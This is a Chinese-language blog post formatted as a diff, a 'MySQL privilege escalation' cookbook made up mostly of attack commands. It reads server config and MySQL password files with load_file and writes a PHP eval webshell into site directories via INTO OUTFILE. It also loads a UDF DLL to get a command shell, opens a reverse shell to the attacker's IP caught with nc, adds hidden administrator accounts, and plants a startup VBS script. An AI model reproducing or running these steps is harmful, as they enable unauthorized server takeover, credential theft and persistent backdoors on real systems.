@@ -1,0 +1,119 @@
+Mysql提权总结 
+2010-11-12 09:29
+mysql备份一句话到网站了，但这里先要得到网站的物理路径，这里怎么得到呢？不要紧，既然有了root还怕得不到吗？直接load_file服务器的IIS配置文件：
+select??load_file(char(67,58,92,87,73,78,68,79,87,83,92,115,121,115,116,101,109,51,50,92,105,110,101,116,115,114,118,92,77,101,116,97,66,97,115,101,46,120,109,108));?
+
+
+是C:\WINDOWS\system32\inetsrv\MetaBase.xml的asc码。导出到本机查看得到路径网站的物理路径，：
+
+
+发现安装mysql安装路径。。。
+
+直接下载user.myduser.myi文件,网上好多教程说搭建mysql环境，其实我觉得不用，直接winhex文件打开user.myd文件。。
+
+MySQL的安装目录有个user.MYD文件，里面存储了mysql.user表中的数据库连接密码
+
+E:/MYSQL5/DATA 这个文件里面 找到MYSQL 这个文件夹
+
+把里面的USER 表[有3个] 把3个全部下载到本地
+
+本地搭建PHP+MYSQL环境 装PHPMYADMIN
+
+在本地MYSQL目录下 找到DATA/MYSQL 目录 新建一个目录：ICE
+
+将我们下载的USER 放到MYSQL目录下DATA/MYSQL/ICE目录[就是我们新建的目录]
+
+然后用PHPMYADMIN ROOT帐户登陆本地MY SQL管理 这样我们可以看到多了一个数据库
+
+那就是ICE 我们进入ICE这个数据库里面 可以发现有一个USER 就是我们下载的那个数据的名字
+
+然后进入 找到ROOT帐号的密码
+
+
+1:phpmyadmin 后台拿webshell
+phpmyadmin爆路径方法:
+weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php
+http://url/phpmyadmin/libraries/select_lang.lib.php 
+pphpmyadmin/libraries/export/xls.php 
+hpmyadmin\themes\darkblue_orange\layout.inc.php 
+
+
+create database temp1;               //建立数据库temp1
+use temp1                            //选择temp1数据库
+create TABLE cdb_temp (cmd text NOT NULL); //在temp1数据库中建立表cdb_temp,cmd字段为空
+Insert INTO cdb_temp (cmd) VALUES('<?php eval_r($_POST[image]);?>');          //在cmd字段中插入值
+select cmd from cdb_temp into outfile 'E:\\IDDCweb\\17qupk\\wwwroot\\hao.php';       //导出到网站目录
+drop TABLE IF exists cdb_temp;              //如果表cdb_temp存在则删除 
+drop database temp1;                 //删除temp1数据库        
+
+
+mysql得系统权限
+mysql -h serverip -uroot -p
+\. c:\mysql.txt
+select Mixconnect('你的机器ip','2008');
+nc -vv -l -p 2008
+
+
+show databases;
+use discuz
+create table cdb_mix(abc longblob);       //建立表cdb_mix
+insert into cdb_mix values(load_file('E:\\IDDCweb\\17qupk\\wwwroot\\Mix.dll'));
+select * from cdb_mix into dumpfile 'c:\\windows\\Mix.dll';                       //把mix.ll移动到winodws目录下
+create function Mixconnect returns string soname 'Mix.dll';
+select Mixconnect('你的机器ip','2008');
+drop table if exists cdb_mix;
+
+如果出现Can't connect to MySQL server on 'localhost' (10061)说明mysql可能假死或者挂了,假死可以自动恢复，要是挂了只有重启mysql或者服务器了.
+
+
+删除存储过程cmdshell再添加一次
+drop function cmdshell;
+Create Function cmdshell returns string soname 'udf.dll';
+
+create function cmdshell returns string soname 'C:\Windows\udf.dll'
+create function cmdshell returns string soname 'c:\windows\system32\udf.dll'
+
+
+先找ROOT账户
+
+C:\Winnt\udf.dll    2000
+C:\Windows\udf.dll 2003
+
+
+现在基本上win的服务器就这两个导出UDF.DLL
+
+create function cmdshell returns string soname 'udf.dll'
+select cmdshell('net user daxia$ 123456 /add');
+select cmdshell('net localgroup administrators daxia$ /add');
+select cmdshell('c:\3389.exe');
+drop function cmdshell; 删除函数
+select cmdshell('netstat -an');
+
+-------邪恶的分割线-----这是最后一招，如果还不能提权就是RP问题了--我就遇到过写进去竟然是空白--
+
+1、查看我们进入数据库中有些什么数据表
+mysql>show tables;
+默认的情况下，test中没有任何表的存在。
+以下为关键的部分
+2、在TEST数据库下创建一个新的表；
+mysql>create table a (cmd text);
+好了，我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为cmd，为text文本。
+3、在表中插入内容
+mysql>insert into a values ("set wshshell=createobject (""wscript.shell"")");
+mysql>insert into a values ("a=wshshell.run (""cmd.exe /c net user 1 1/add"",0)");
+mysql>insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators 1 /add"",0)");
+注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序！
+4、好了，现在我们来看看表a中有些什么
+mysql>select * from a;
+我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步
+5、输出表为一个VBS的脚本文件
+mysql>select * from a into outfile "c://docume~1//administrator//「开始」菜单//程序//启动//a.vbs";
+
+
+
+show tables;
+create table a (cmd text);
+insert into a values ("a='<?php eval_r($_POST[image]);?>')");
+select * from a into outfile 
+"//home//bingocheun//domains//liuyifei.cc//public_html//uc_server//1.php"
+
